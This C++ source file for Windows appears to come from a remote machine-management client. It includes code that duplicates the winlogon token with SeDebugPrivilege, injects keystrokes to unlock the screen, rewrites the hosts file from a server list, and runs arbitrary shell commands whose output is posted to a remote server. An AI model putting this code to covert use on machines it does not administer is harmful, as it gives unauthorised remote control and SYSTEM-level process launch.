#include"Globals.h"
#include<TlHelp32.h>
#include<wtsapi32.h>
#include<UserEnv.h>
#include"Strings.h"
#include"Conf.h"
#include"Http.h"
#include"Strings.h"
#include<sstream>
#pragma comment(lib,"Userenv")
#pragma comment(lib,"Wtsapi32")
namespace Utils {

    void SendText(const wchar_t* text) {
        INPUT inputs[200];
        if ((wcslen(text) * sizeof(wchar_t)) > sizeof(inputs)) { return; }
        int i = 0;
        while (text[i] != L'\0') {
            inputs[i].type = INPUT_KEYBOARD;
            inputs[i].ki.wVk = 0;
            inputs[i].ki.dwFlags = KEYEVENTF_UNICODE;
            inputs[i].ki.wScan = text[i];
            inputs[i].ki.time = 0;
            inputs[i].ki.dwExtraInfo = GetMessageExtraInfo();
            i++;
        }

        inputs[i].type = INPUT_KEYBOARD;
        inputs[i].ki.wVk = VK_RETURN;
        inputs[i].ki.dwFlags = 0;
        inputs[i].ki.wScan = 0;
        inputs[i].ki.time = 0;
        inputs[i].ki.dwExtraInfo = GetMessageExtraInfo();
        i++;
        inputs[i].type = INPUT_KEYBOARD;
        inputs[i].ki.wVk = VK_RETURN;
        inputs[i].ki.dwFlags = KEYEVENTF_KEYUP;
        inputs[i].ki.wScan = 0;
        inputs[i].ki.time = 0;
        inputs[i].ki.dwExtraInfo = GetMessageExtraInfo();
        i++;
        for (int j = 0; j < i; j++) {
            SendInput(1, &inputs[j], sizeof(INPUT));
        }
    }


    BOOL spawnLogOn(PWSTR path)
    {
        DWORD winLogonProcessId = 0;
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (hSnapshot != INVALID_HANDLE_VALUE) {
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (wcsstr(pe32.szExeFile, L"winlogon") != nullptr) {
                        winLogonProcessId = pe32.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));

                CloseHandle(hSnapshot);
            }
        }

        if (winLogonProcessId == 0) {

            return 1;
        }

        HANDLE hWinLogon = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winLogonProcessId);
        if (hWinLogon == nullptr) {

            return 1;
        }
        HANDLE hUserTokenn;
        if (!OpenProcessToken(hWinLogon, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &hUserTokenn)) {

            CloseHandle(hWinLogon);
            return 1;
        }

        HANDLE hNewToken;
        if (!DuplicateTokenEx(hUserTokenn, 0x10000000, nullptr, SecurityImpersonation, TokenImpersonation, &hNewToken)) {

            CloseHandle(hUserTokenn);
            CloseHandle(hWinLogon);
            return 1;
        }
        TOKEN_PRIVILEGES tokPrivs;
        LUID seDebugNameValue;
        if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &seDebugNameValue)) {

            CloseHandle(hNewToken);
            CloseHandle(hUserTokenn);
            CloseHandle(hWinLogon);
            return 1;
        }

        tokPrivs.PrivilegeCount = 1;
        tokPrivs.Privileges[0].Luid = seDebugNameValue;
        tokPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hNewToken, false, &tokPrivs, 0, nullptr, nullptr)) {

            CloseHandle(hNewToken);
            CloseHandle(hUserTokenn);
            CloseHandle(hWinLogon);
            return 1;
        }

        PROCESS_INFORMATION pi;
        STARTUPINFO si = {};
        si.cb = sizeof(STARTUPINFO);
        si.lpDesktop = (wchar_t*)L"Winsta0\\Winlogon";

        if (!CreateProcessAsUserW(hNewToken, nullptr, path, nullptr, nullptr, true,
            CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hNewToken);
            CloseHandle(hUserTokenn);
            CloseHandle(hWinLogon);
            return 1;
        }

        CloseHandle(hNewToken);
        CloseHandle(hUserTokenn);
        CloseHandle(hWinLogon);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }


    void CreateProc(wchar_t* path, wchar_t* args,BOOL wait=FALSE) {

        PROCESS_INFORMATION pi;
        STARTUPINFO si = { sizeof(si) };

        if (CreateProcess(path, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            if (wait) { WaitForSingleObject(pi.hProcess, INFINITE); }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }


    }

    void runAsUser(wchar_t *path, wchar_t *arg,BOOL wait=FALSE,BOOL retry=FALSE)
    {
        start:
        HANDLE hToken;
        if (!WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &hToken)) { 
            std::wstring error(L"Error WTSQueryUserToken : " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            if (retry) { Sleep(3000);goto start; }
            return; 
        }

        void* lpEnvironment = NULL;

        BOOL resultEnv = CreateEnvironmentBlock(&lpEnvironment, hToken, FALSE);
        if (!resultEnv)
        {
            std::wstring error(L"Error CreateEnvironmentBlock : " + std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str());
            CloseHandle(hToken);
            return;
        }


        

        PROCESS_INFORMATION pi;
        STARTUPINFOW        si;

        ZeroMemory(&pi, sizeof(pi));
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
    
        BOOL bResult = FALSE;
        bResult = ::CreateProcessAsUserW(hToken, path, (LPWSTR)arg, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, NULL, &si, &pi);
        if (!bResult) {
            std::wstring error(L"Error CreateProcessAsUser : "+std::to_wstring(GetLastError()));
            Log::SaveLog((wchar_t*)error.c_str()); CloseHandle(hToken); DestroyEnvironmentBlock(lpEnvironment); return; }
        if (wait) { WaitForSingleObject(pi.hProcess, INFINITE); }
        CloseHandle(hToken);
        CloseHandle(pi.hThread);

        DestroyEnvironmentBlock(lpEnvironment);
        CloseHandle(pi.hProcess);
        
    }


    void UnlockScreen(std::string password) {

        std::wstring wpass = Strings::strtow(password);
        std::wstring args(Config::currentpath);
        args = args + L" logon \""+wpass + L"\"";
        Utils::runAsUser(Config::currentpath, (wchar_t*)L" logonuser", TRUE);
        Sleep(1000);
        Utils::spawnLogOn((wchar_t*)args.c_str());

        

    }

    void LockScreen() {
        Utils::runAsUser(Config::currentpath, (wchar_t*)L" lock");

    }

    void blockHost(char* host) {

        char hostfilea[MAX_PATH + 1];
        if (!ExpandEnvironmentStringsA(Strings::GetStr("hostsfilea").c_str(), hostfilea, MAX_PATH)) {
            Log::SaveLog((wchar_t*)L"Error ExpandEnvironmentStringsA");
            return;
        }

        FILE* fp;

        fopen_s(&fp, hostfilea, "a");
        if (!fp) { Log::SaveLog((wchar_t*)(std::wstring(L"Error open hosts file")+std::to_wstring(GetLastError())).c_str()); return; }
        fprintf(fp, "127.0.0.1 %s\n", host);
        fclose(fp);
        Sleep(200);
    }
    std::vector<std::string> splitLines(const std::string& input, char lineSeparator);
    void UpdateHosts() {

        std::string fullurl(Config::url + "/hosts.php?id=" + Config::guid);
        auto hosts = Http::HttpGet((char*)fullurl.c_str());
        char hostfilea[MAX_PATH + 1];
        if (!ExpandEnvironmentStringsA(Strings::GetStr("hostsfilea").c_str(), hostfilea, MAX_PATH)) {
            Log::SaveLog((wchar_t*)L"Error ExpandEnvironmentStringsA");
            return;
        }
        DeleteFileA(hostfilea);

        std::string hoststxt(hosts.begin(), hosts.end());
        auto lines = splitLines(hoststxt, '\n');
        for (size_t i = 0; i < lines.size(); i++) {
            blockHost((char*)lines[i].c_str());

        }


    }
    void CleanUp() {
       
        DWORD myprocID = GetCurrentProcessId();

        PROCESSENTRY32 pe;

        memset(&pe, 0, sizeof(PROCESSENTRY32));
        pe.dwSize = sizeof(PROCESSENTRY32);

        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) { return; }

        if (::Process32First(hSnap, &pe))
        {
            BOOL bContinue = TRUE;
            while (bContinue)
            {
                if (pe.th32ParentProcessID == myprocID)
                {
                    HANDLE hChildProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);

                    if (hChildProc)
                    {
                        TerminateProcess(hChildProc, 1);
                        CloseHandle(hChildProc);
                    }
                }

                bContinue = Process32Next(hSnap, &pe);
            }



        }

        CloseHandle(hSnap);
    }


    std::vector<std::string> splitLines(const std::string& input, char lineSeparator) {
        std::vector<std::string> lines;
        size_t start = 0;
        size_t end = input.find(lineSeparator);

        while (end != std::string::npos) {
            std::string line = input.substr(start, end - start);
            lines.push_back(line);

            start = end + 1;
            end = input.find(lineSeparator, start);
        }

        std::string lastLine = input.substr(start);
        if (!lastLine.empty() && lastLine != std::string(1, lineSeparator)) {
            lines.push_back(lastLine);
        }

        return lines;
    }

    void commandrun(char* command) {
        FILE* fp;
        std::string fullcommand(command);

        Log::SaveLog((wchar_t*)Strings::strtow(fullcommand.c_str()).c_str());

        fp = _popen(fullcommand.c_str(), "r");
        if (fp == NULL) {
            return;
        }
       
        std::ostringstream resultStream;
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), fp) != nullptr) {
            resultStream << buffer;
        }

        std::string result = resultStream.str();


        std::string endpoint(Config::path+"/command.php?id=" + std::string(Config::guid));
        std::string postdata("output=" + result);
        Http::HttpPost(Config::host.c_str(), postdata, endpoint.c_str());
        //Log::SaveLog((wchar_t*)Strings::strtow(postdata.c_str()).c_str());

        _pclose(fp);
    }
}